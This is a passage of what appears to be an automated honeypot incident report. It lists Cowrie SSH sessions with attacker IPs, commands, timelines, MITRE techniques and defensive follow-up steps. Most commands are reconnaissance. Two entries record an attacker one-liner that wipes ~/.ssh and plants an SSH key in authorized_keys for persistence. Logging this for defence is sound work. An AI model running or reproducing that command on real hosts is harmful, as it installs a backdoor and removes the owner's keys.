| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 03:39:27` | `cowrie.session.connect` |
| `2026-03-21 03:39:27` | `cowrie.client.version` |
| `2026-03-21 03:39:27` | `cowrie.client.kex` |
| `2026-03-21 03:39:28` | `cowrie.login.success` |
| `2026-03-21 03:39:28` | `cowrie.session.params` |
| `2026-03-21 03:39:28` | `cowrie.command.input` |
| `2026-03-21 03:39:29` | `cowrie.log.closed` |
| `2026-03-21 03:39:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1ec2d742dc7

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 03:45 |
| **Last Seen** | 2026-03-21 03:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 03:45:29` | `cowrie.session.connect` |
| `2026-03-21 03:45:29` | `cowrie.client.version` |
| `2026-03-21 03:45:29` | `cowrie.client.kex` |
| `2026-03-21 03:45:30` | `cowrie.login.success` |
| `2026-03-21 03:45:30` | `cowrie.session.params` |
| `2026-03-21 03:45:30` | `cowrie.command.input` |
| `2026-03-21 03:45:31` | `cowrie.log.closed` |
| `2026-03-21 03:45:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73a489f93183

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 03:51 |
| **Last Seen** | 2026-03-21 03:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 03:51:45` | `cowrie.session.connect` |
| `2026-03-21 03:51:45` | `cowrie.client.version` |
| `2026-03-21 03:51:46` | `cowrie.client.kex` |
| `2026-03-21 03:51:46` | `cowrie.login.success` |
| `2026-03-21 03:51:47` | `cowrie.session.params` |
| `2026-03-21 03:51:47` | `cowrie.command.input` |
| `2026-03-21 03:51:47` | `cowrie.log.closed` |
| `2026-03-21 03:51:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b31fb491040

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 03:57 |
| **Last Seen** | 2026-03-21 03:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `nproc 2>/dev/null || (grep -c '^processor' /proc/cpuinfo 2>/dev/null) || echo 0, grep -c ^processor /proc/cpuinfo 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 03:57:59` | `cowrie.session.connect` |
| `2026-03-21 03:57:59` | `cowrie.client.version` |
| `2026-03-21 03:57:59` | `cowrie.client.kex` |
| `2026-03-21 03:58:00` | `cowrie.login.success` |
| `2026-03-21 03:58:00` | `cowrie.session.params` |
| `2026-03-21 03:58:00` | `cowrie.command.input` |
| `2026-03-21 03:58:00` | `cowrie.command.input` |
| `2026-03-21 03:58:00` | `cowrie.log.closed` |
| `2026-03-21 03:58:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-289170a5db13

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 04:04 |
| **Last Seen** | 2026-03-21 04:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uptime` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 04:04:02` | `cowrie.session.connect` |
| `2026-03-21 04:04:02` | `cowrie.client.version` |
| `2026-03-21 04:04:02` | `cowrie.client.kex` |
| `2026-03-21 04:04:03` | `cowrie.login.success` |
| `2026-03-21 04:04:03` | `cowrie.session.params` |
| `2026-03-21 04:04:03` | `cowrie.command.input` |
| `2026-03-21 04:04:03` | `cowrie.log.closed` |
| `2026-03-21 04:04:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b69a55d75aa

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 04:10 |
| **Last Seen** | 2026-03-21 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -m 2>/dev/null || echo unknown` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 04:10:06` | `cowrie.session.connect` |
| `2026-03-21 04:10:06` | `cowrie.client.version` |
| `2026-03-21 04:10:07` | `cowrie.client.kex` |
| `2026-03-21 04:10:07` | `cowrie.login.success` |
| `2026-03-21 04:10:08` | `cowrie.session.params` |
| `2026-03-21 04:10:08` | `cowrie.command.input` |
| `2026-03-21 04:10:08` | `cowrie.log.closed` |
| `2026-03-21 04:10:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-220992a3bb58

| Field | Detail |
|---|---|
| **Source IP** | `182.227.214[.]33` |
| **First Seen** | 2026-03-21 04:10 |
| **Last Seen** | 2026-03-21 04:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 04:10:48` | `cowrie.session.connect` |
| `2026-03-21 04:10:49` | `cowrie.client.version` |
| `2026-03-21 04:10:49` | `cowrie.client.kex` |
| `2026-03-21 04:10:51` | `cowrie.login.success` |
| `2026-03-21 04:10:51` | `cowrie.direct-tcpip.request` |
| `2026-03-21 04:10:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.227.214[.]33` to AbuseIPDB if not already reported
- [ ] Block `182.227.214[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-497b8a781ca6

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]137` |
| **First Seen** | 2026-03-21 04:11 |
| **Last Seen** | 2026-03-21 04:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 04:11:01` | `cowrie.session.connect` |
| `2026-03-21 04:11:02` | `cowrie.client.version` |
| `2026-03-21 04:11:02` | `cowrie.client.kex` |
| `2026-03-21 04:11:03` | `cowrie.login.success` |
| `2026-03-21 04:11:04` | `cowrie.direct-tcpip.request` |
| `2026-03-21 04:11:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]137` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d874430a16be

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 04:16 |
| **Last Seen** | 2026-03-21 04:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `whoami` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 04:16:15` | `cowrie.session.connect` |
| `2026-03-21 04:16:15` | `cowrie.client.version` |
| `2026-03-21 04:16:15` | `cowrie.client.kex` |
| `2026-03-21 04:16:15` | `cowrie.login.success` |
| `2026-03-21 04:16:16` | `cowrie.session.params` |
| `2026-03-21 04:16:16` | `cowrie.command.input` |
| `2026-03-21 04:16:16` | `cowrie.log.closed` |
| `2026-03-21 04:16:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5ae286c862f

| Field | Detail |
|---|---|
| **Source IP** | `120.48.39[.]202` |
| **First Seen** | 2026-03-21 04:19 |
| **Last Seen** | 2026-03-21 04:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 1 > /dev/null && cat /bin/echo` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 04:19:01` | `cowrie.session.connect` |
| `2026-03-21 04:19:01` | `cowrie.client.version` |
| `2026-03-21 04:19:01` | `cowrie.client.kex` |
| `2026-03-21 04:19:03` | `cowrie.login.success` |
| `2026-03-21 04:19:03` | `cowrie.session.params` |
| `2026-03-21 04:19:03` | `cowrie.command.input` |
| `2026-03-21 04:19:07` | `cowrie.log.closed` |
| `2026-03-21 04:19:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.39[.]202` to AbuseIPDB if not already reported
- [ ] Block `120.48.39[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-470a6090ecc7

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 04:22 |
| **Last Seen** | 2026-03-21 04:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `history | tail -5` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 04:22:25` | `cowrie.session.connect` |
| `2026-03-21 04:22:25` | `cowrie.client.version` |
| `2026-03-21 04:22:26` | `cowrie.client.kex` |
| `2026-03-21 04:22:26` | `cowrie.login.success` |
| `2026-03-21 04:22:27` | `cowrie.session.params` |
| `2026-03-21 04:22:27` | `cowrie.command.input` |
| `2026-03-21 04:22:27` | `cowrie.log.closed` |
| `2026-03-21 04:22:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b1a4ce42e17

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 04:28 |
| **Last Seen** | 2026-03-21 04:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 04:28:32` | `cowrie.session.connect` |
| `2026-03-21 04:28:32` | `cowrie.client.version` |
| `2026-03-21 04:28:32` | `cowrie.client.kex` |
| `2026-03-21 04:28:33` | `cowrie.login.success` |
| `2026-03-21 04:28:33` | `cowrie.session.params` |
| `2026-03-21 04:28:33` | `cowrie.command.input` |
| `2026-03-21 04:28:33` | `cowrie.log.closed` |
| `2026-03-21 04:28:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-465edd07a3b2

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 04:34 |
| **Last Seen** | 2026-03-21 04:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 04:34:46` | `cowrie.session.connect` |
| `2026-03-21 04:34:46` | `cowrie.client.version` |
| `2026-03-21 04:34:47` | `cowrie.client.kex` |
| `2026-03-21 04:34:47` | `cowrie.login.success` |
| `2026-03-21 04:34:48` | `cowrie.session.params` |
| `2026-03-21 04:34:48` | `cowrie.command.input` |
| `2026-03-21 04:34:48` | `cowrie.log.closed` |
| `2026-03-21 04:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1077179b3bff

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 04:41 |
| **Last Seen** | 2026-03-21 04:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 04:41:02` | `cowrie.session.connect` |
| `2026-03-21 04:41:02` | `cowrie.client.version` |
| `2026-03-21 04:41:02` | `cowrie.client.kex` |
| `2026-03-21 04:41:03` | `cowrie.login.success` |
| `2026-03-21 04:41:03` | `cowrie.session.params` |
| `2026-03-21 04:41:03` | `cowrie.command.input` |
| `2026-03-21 04:41:03` | `cowrie.log.closed` |
| `2026-03-21 04:41:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac163fbd4ed4

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 04:47 |
| **Last Seen** | 2026-03-21 04:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `pwd` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 04:47:13` | `cowrie.session.connect` |
| `2026-03-21 04:47:13` | `cowrie.client.version` |
| `2026-03-21 04:47:13` | `cowrie.client.kex` |
| `2026-03-21 04:47:13` | `cowrie.login.success` |
| `2026-03-21 04:47:14` | `cowrie.session.params` |
| `2026-03-21 04:47:14` | `cowrie.command.input` |
| `2026-03-21 04:47:14` | `cowrie.log.closed` |
| `2026-03-21 04:47:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6e704ede830

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 04:53 |
| **Last Seen** | 2026-03-21 04:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ps aux | head -10` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 04:53:28` | `cowrie.session.connect` |
| `2026-03-21 04:53:28` | `cowrie.client.version` |
| `2026-03-21 04:53:28` | `cowrie.client.kex` |
| `2026-03-21 04:53:29` | `cowrie.login.success` |
| `2026-03-21 04:53:29` | `cowrie.session.params` |
| `2026-03-21 04:53:29` | `cowrie.command.input` |
| `2026-03-21 04:53:30` | `cowrie.log.closed` |
| `2026-03-21 04:53:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c0759b88a35

| Field | Detail |
|---|---|
| **Source IP** | `34.93.128[.]179` |
| **First Seen** | 2026-03-21 04:57 |
| **Last Seen** | 2026-03-21 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 04:57:00` | `cowrie.session.connect` |
| `2026-03-21 04:57:00` | `cowrie.client.version` |
| `2026-03-21 04:57:00` | `cowrie.client.kex` |
| `2026-03-21 04:57:00` | `cowrie.login.success` |
| `2026-03-21 04:57:00` | `cowrie.session.params` |
| `2026-03-21 04:57:00` | `cowrie.command.input` |
| `2026-03-21 04:57:00` | `cowrie.command.failed` |
| `2026-03-21 04:57:00` | `cowrie.log.closed` |
| `2026-03-21 04:57:00` | `cowrie.session.params` |
| `2026-03-21 04:57:00` | `cowrie.command.input` |
| `2026-03-21 04:57:00` | `cowrie.session.file_download` |
| `2026-03-21 04:57:00` | `cowrie.log.closed` |
| `2026-03-21 04:57:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.93.128[.]179` to AbuseIPDB if not already reported
- [ ] Block `34.93.128[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-333a23225f58

| Field | Detail |
|---|---|
| **Source IP** | `34.93.128[.]179` |
| **First Seen** | 2026-03-21 04:57 |
| **Last Seen** | 2026-03-21 04:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 04:57:01` | `cowrie.session.connect` |
| `2026-03-21 04:57:01` | `cowrie.client.version` |
| `2026-03-21 04:57:01` | `cowrie.client.kex` |
| `2026-03-21 04:57:02` | `cowrie.login.success` |
| `2026-03-21 04:57:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.93.128[.]179` to AbuseIPDB if not already reported
- [ ] Block `34.93.128[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1476e66ac75

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 04:59 |
| **Last Seen** | 2026-03-21 04:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 04:59:48` | `cowrie.session.connect` |
| `2026-03-21 04:59:48` | `cowrie.client.version` |
| `2026-03-21 04:59:48` | `cowrie.client.kex` |
| `2026-03-21 04:59:49` | `cowrie.login.success` |
| `2026-03-21 04:59:49` | `cowrie.session.params` |
| `2026-03-21 04:59:49` | `cowrie.command.input` |
| `2026-03-21 04:59:49` | `cowrie.log.closed` |
| `2026-03-21 04:59:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9dc52d36486

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-03-21 05:01 |
| **Last Seen** | 2026-03-21 05:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 05:01:22` | `cowrie.session.connect` |
| `2026-03-21 05:01:22` | `cowrie.client.version` |
| `2026-03-21 05:01:23` | `cowrie.client.kex` |
| `2026-03-21 05:01:24` | `cowrie.login.success` |
| `2026-03-21 05:01:24` | `cowrie.session.params` |
| `2026-03-21 05:01:24` | `cowrie.command.input` |
| `2026-03-21 05:01:24` | `cowrie.command.failed` |
| `2026-03-21 05:01:24` | `cowrie.log.closed` |
| `2026-03-21 05:01:25` | `cowrie.session.params` |
| `2026-03-21 05:01:25` | `cowrie.command.input` |
| `2026-03-21 05:01:25` | `cowrie.session.file_download` |
| `2026-03-21 05:01:25` | `cowrie.log.closed` |
| `2026-03-21 05:01:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43ba7554f3ce

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-03-21 05:01 |
| **Last Seen** | 2026-03-21 05:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 05:01:28` | `cowrie.session.connect` |
| `2026-03-21 05:01:28` | `cowrie.client.version` |
| `2026-03-21 05:01:28` | `cowrie.client.kex` |
| `2026-03-21 05:01:29` | `cowrie.login.success` |
| `2026-03-21 05:01:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-736b00417d64

| Field | Detail |
|---|---|
| **Source IP** | `154.219.104[.]82` |
| **First Seen** | 2026-03-21 05:01 |
| **Last Seen** | 2026-03-21 05:02 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 05:01:59` | `cowrie.session.connect` |
| `2026-03-21 05:01:59` | `cowrie.client.version` |
| `2026-03-21 05:01:59` | `cowrie.client.kex` |
| `2026-03-21 05:01:59` | `cowrie.login.success` |
| `2026-03-21 05:02:46` | `cowrie.session.file_upload` |
| `2026-03-21 05:02:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.104[.]82` to AbuseIPDB if not already reported
- [ ] Block `154.219.104[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f2d86931e7e

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 05:06 |
| **Last Seen** | 2026-03-21 05:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `nproc 2>/dev/null || (grep -c '^processor' /proc/cpuinfo 2>/dev/null) || echo 0, grep -c ^processor /proc/cpuinfo 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 05:06:05` | `cowrie.session.connect` |
| `2026-03-21 05:06:05` | `cowrie.client.version` |
| `2026-03-21 05:06:05` | `cowrie.client.kex` |
| `2026-03-21 05:06:06` | `cowrie.login.success` |
| `2026-03-21 05:06:06` | `cowrie.session.params` |
| `2026-03-21 05:06:06` | `cowrie.command.input` |
| `2026-03-21 05:06:06` | `cowrie.command.input` |
| `2026-03-21 05:06:06` | `cowrie.log.closed` |
| `2026-03-21 05:06:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4d4e9a7a920

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 05:12 |
| **Last Seen** | 2026-03-21 05:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 05:12:24` | `cowrie.session.connect` |
| `2026-03-21 05:12:24` | `cowrie.client.version` |
| `2026-03-21 05:12:24` | `cowrie.client.kex` |
| `2026-03-21 05:12:24` | `cowrie.login.success` |
| `2026-03-21 05:12:25` | `cowrie.session.params` |
| `2026-03-21 05:12:25` | `cowrie.command.input` |
| `2026-03-21 05:12:25` | `cowrie.log.closed` |
